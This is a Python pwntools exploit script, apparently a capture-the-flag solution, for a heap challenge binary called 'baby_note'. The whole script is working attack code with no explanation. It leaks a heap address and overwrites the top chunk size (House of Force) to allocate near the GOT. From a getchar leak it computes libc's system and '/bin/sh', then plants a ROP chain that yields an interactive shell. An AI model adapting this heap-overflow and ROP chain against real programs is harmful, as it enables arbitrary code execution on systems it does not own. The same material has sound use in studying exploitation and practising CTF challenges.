from pwn import *
r = process("./baby_note")
#r = remote("104.250.105.158",6002)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def create( idx , size ):
    r.sendlineafter("[?] Choice : ","1")
    r.sendlineafter("index : ",str(idx))
    r.sendlineafter("size : ",str(size))

def view( idx ):
    r.sendlineafter("[?] Choice : ","4")
    r.sendlineafter("index : ",str(idx))
    return r.recvline().strip()

def edit( idx , size , p ):
    log.info("here")
    r.sendlineafter("[?] Choice : ","2")
    r.sendlineafter("index : ", str(idx))
    r.sendlineafter("size : " , str(size))
    r.sendlineafter("text : ",p)

def leak_addr():
    r.sendlineafter("[?] Choice : ","1337")
    return r.recvline().strip()


def main():
	#context.terminal = ['tmux', 'splitw', '-h']
	#gdb.attach(r)
	create(0 , 256)
	##############################
	heap_addr = int(leak_addr(),16) # leak heap addres
	top_chunk = heap_addr + 264  	# hitung top chunk heap
	##############################
	log.info("address of heap memory at : " + hex(heap_addr))
	log.info("top chunk at : " + hex(top_chunk))

	# overwrite top chunk 
	p = ''
	p += "A"*264
	p += p64(-1,signed=True)
	edit( 0 , len(p) , p)
	log.info("payload untuk overwrite top chunk : " + str(p))

	libc_start_main = 0x000000602038
	evilsize = libc_start_main - 16 - top_chunk


	create( 1 , evilsize)
	create( 2 , 100 )

	
	getchar_libc = u64(view(2) + "\x00\x00")
	log.info("getchar@GLIBC di alamat : " + hex(getchar_libc))
	base_libc = getchar_libc - libc.symbols['getchar']
	system = base_libc + libc.symbols['system']
	binsh = base_libc + libc.search("/bin/sh").next()
	pop_rdi = 0x0000000000400d23
	one_shot = base_libc + 0xf1147

	log.info("base libc di alamat : " + hex(base_libc))
	log.info("one_shot : " + hex(one_shot))


	#p = p64(one_shot)
	p = p64(pop_rdi)
	p += p64(binsh)
	p += p64(system)
	p += p64(90)

	edit( 2 , len(p) , p)

	r.interactive()



main()
